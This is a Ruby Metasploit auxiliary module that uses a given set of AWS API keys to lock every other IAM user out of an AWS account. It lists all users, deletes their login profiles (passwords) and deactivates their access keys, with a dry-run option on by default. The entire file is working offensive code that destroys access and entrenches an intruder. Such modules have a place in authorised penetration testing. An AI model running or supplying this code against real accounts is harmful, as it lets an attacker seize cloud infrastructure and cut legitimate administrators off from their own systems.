##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/aws/client'

class MetasploitModule < Msf::Auxiliary

  include Metasploit::Framework::Aws::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "Locks out all AWS IAM User except you",
        'Description'    => %q{
          This module will attempt to lock out all AWS (Amazon Web Services) IAM
          (Identity and Access Management) users except the user who's API keys
          you have. WARNING: this module will delete all user's login profiles
          (their passwords), all except for the user whose keys you use to run
          this module.
        },
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Javier Godinez <godinezj[at]gmail.com>'
        ]
      )
    )

    register_options(
      [
        OptString.new('AccessKeyId', [true, 'AWS access key', '']),
        OptString.new('SecretAccessKey', [true, 'AWS secret key', '']),
        OptString.new('Token', [false, 'AWS session token', '']),
        OptBool.new('DRY_RUN', [true, 'Does not perform destructive actions', true])
      ]
    )
    register_advanced_options(
      [
        OptString.new('RHOST', [true, 'AWS IAM Endpoint', 'iam.amazonaws.com']),
        OptString.new('RPORT', [true, 'AWS IAM Endpoint TCP Port', 443]),
        OptBool.new('SSL', [true, 'AWS IAM Endpoint SSL', true]),
        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
      ]
    )
    deregister_options('VHOST')
  end

  def run
    # setup creds for making IAM API calls
    creds = {
      'AccessKeyId' => datastore['AccessKeyId'],
      'SecretAccessKey' => datastore['SecretAccessKey']
    }
    creds['Token'] = datastore['Token'] unless datastore['Token'].blank?

    # get current user
    action = 'GetUser'
    doc = call_iam(creds, 'Action' => action)
    doc = print_results(doc, action)
    if doc.nil? || !doc.include?('UserName')
      print_error("Could not retrieve current user")
      return
    end
    current_user = doc['UserName']

    # get users
    print_status("Listing users")
    action = 'ListUsers'
    doc = call_iam(creds, 'Action' => action)
    doc = print_results(doc, action)
    if doc.nil? || !doc.include?('member')
      print_error("Could not retrieve users")
      return
    end

    # list of all users to be dissabled
    users = doc['member'].map { |u| u['UserName'] }.select { |u| u != current_user }
    print_status("Locking out users: #{users.join(',')}")
    users.each do |user|
      # delete user's profile
      print_status("Deleting #{user}'s login profile (#{!datastore['DRY_RUN']})")
      unless datastore['DRY_RUN']
        action = 'DeleteLoginProfile'
        doc = call_iam(creds, 'Action' => action, 'UserName' => user)
        print_results(doc, action)
      end

      # disable API access keys
      action = 'ListAccessKeys'
      doc = call_iam(creds, 'Action' => action, 'UserName' => user)
      doc = print_results(doc, action)
      if doc.nil? || !doc['AccessKeyMetadata'] || !doc['AccessKeyMetadata'].include?('member')
        print_status("Could not retrieve #{user}'s access keys")
      else
        doc.fetch('AccessKeyMetadata').fetch('member').each do |key_info|
          print_status("Disabling #{user}'s access key: #{key_info.fetch('AccessKeyId')} (#{!datastore['DRY_RUN']})")
          next if datastore['DRY_RUN']
          action = 'UpdateAccessKey'
          doc = call_iam(creds, 'Action' => action, 'UserName' => user, 'AccessKeyId' => key_info.fetch('AccessKeyId'), 'Status' => 'Inactive')
          print_results(doc, action)
        end
      end
    end
  end
end
